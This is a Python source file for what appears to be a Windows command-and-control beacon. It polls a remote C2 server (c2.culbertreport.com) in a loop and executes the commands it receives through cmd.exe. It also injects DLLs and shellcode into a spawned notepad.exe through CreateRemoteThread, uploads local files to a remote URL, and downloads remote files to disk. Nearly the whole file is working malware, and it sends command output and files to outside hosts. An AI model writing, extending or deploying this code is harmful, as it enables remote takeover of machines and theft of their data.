import subprocess
from subprocess import PIPE
import sys
from ctypes import *
import psutil
import requests
import time


def get_pid(process_name):
    """
    Takes in a process name
    Returns a process ID
    """
    for proc in psutil.process_iter():
        if proc.name() == process_name:
            return proc.pid


def proc_inject(shellcode, sacrificial_process='notepad.exe'):
    '''
    Section still work in progress, does not currently work
    '''
    notepad = subprocess.Popen([sacrificial_process])  # Start a sacrificial process
    pid = get_pid(sacrificial_process)
    PAGE_EXECUTE_READWRITE = 0x00000040
    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
    VIRTUAL_MEM = (0x1000 | 0x2000)
    kernel32 = windll.kernel32
    pid_to_kill = pid
    padding = 4 - (len(pid))
    replace_value = pid + ("\x00" * padding)
    replace_string = "\x41" * 4
    shellcode = shellcode.replace(replace_string, replace_value)
    code_size = len(shellcode)
    # Get a handle to the process we are injecting into.
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    if not h_process:
        return f"[*] Couldn't acquire a handle to PID: {pid}"
    # Allocate some space for the shellcode
    arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size,
                                          VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
    # Write out the shellcode
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, shellcode,
                                code_size, byref(written))
    # Now we create the remote thread and point its entry routine
    # to be head of our shellcode
    thread_id = c_ulong(0)
    if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None,
                                       0, byref(thread_id)):
        return "[*] Failed to inject process-killing shellcode. Exiting."
    else:
        return "[*] Process injected successfully."


def dll_inject(dll_path, sacrificial_process='notepad.exe'):
    """
    Taken from grayhat Python
    Adapted for our use
    Requires a DLL path and a sacrificial_process is optional.
    If no process name is provided, notepad.exe will be used
    """
    notepad = subprocess.Popen([sacrificial_process])  # Start a sacrificial process
    pid = get_pid(sacrificial_process)
    PAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
    VIRTUAL_MEM = (0x1000 | 0x2000)
    kernel32 = windll.kernel32

    dll_len = len(dll_path)
    # Get a handle to the process we are injecting into.
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    if not h_process:
        return f"[*] Couldn't acquire a handle to PID: {pid}"

    # Allocate some space for the DLL path
    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)
    # Write the DLL path into the allocated space
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))
    # We need to resolve the address for LoadLibraryA
    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
    # Now we try to create the remote thread, with the entry point set
    # to LoadLibraryA and a pointer to the DLL path as its single parameter
    thread_id = c_ulong(0)

    if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
        return "[*] Failed to inject the DLL. Exiting."
    else:
        return "[*] Remote thread created."


def cmdexe(beacon_command):
    """
    This takes in a string to execute
    Returns the output if any available
    """
    DETACHED_PROCESS = 0x00000008  # For console processes, the new process does not inherit its parent's console
    # https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags?redirectedfrom=MSDN
    command = ['cmd.exe', '/C', beacon_command]
    process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    out, err = process.communicate()
    out = out.decode()
    return out


def upload(filePath, url="http://httpbin.org/post"):
    '''
    Takes in a URL and filepath
    '''
    uploadFile = open(filePath, 'rb')
    uploadUrl = url
    status = requests.post(uploadUrl, files={"Files": uploadFile})


def dwnld(url, ext):
    """
    This takes in a url and ext to download from
    The extension is required for when saving it
    """
    r = requests.get(url)
    open(f'C:\\Users\\Public\\test{ext}', 'wb').write(r.content)


headers = {
    'User-Agent': 'Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefoxversion'
    # Set our UA to firefox
}

# Below is the cert requirements for mTLS when using requests
# , cert=('client.crt', 'client.key'), verify='ca.crt'
while 1:
    a = requests.get('http://c2.culbertreport.com:8000', headers=headers)
    cmd = a.text
    print(cmd)
    op = cmd.split(';')[0]
    cm = cmd.split(';')[1]
    ex = cmd.split(';')[2]
    if op == 'cmd':
        returned = cmdexe(cm)
        response = requests.post('http://httpbin.org/post', data=returned, headers=headers)
        print(response.request.url)
        print(response.request.body)
        print(response.request.headers)
    if op == 'inject':
        returned = dll_inject(cm)
        response = requests.post('http://httpbin.org/post', data=returned, headers=headers)
        print(response.request.url)
        print(response.request.body)
        print(response.request.headers)
    if op == 'proc':
        returned = proc_inject(cm)
        response = requests.post('http://httpbin.org/post', data=returned, headers=headers)
        print(response.request.url)
        print(response.request.body)
        print(response.request.headers)
    if op == 'download':
        dwnld(cm, ex)
    if op == 'upload':
        upload(cm, ex)
    else:
        time.sleep(1)
    time.sleep(20)
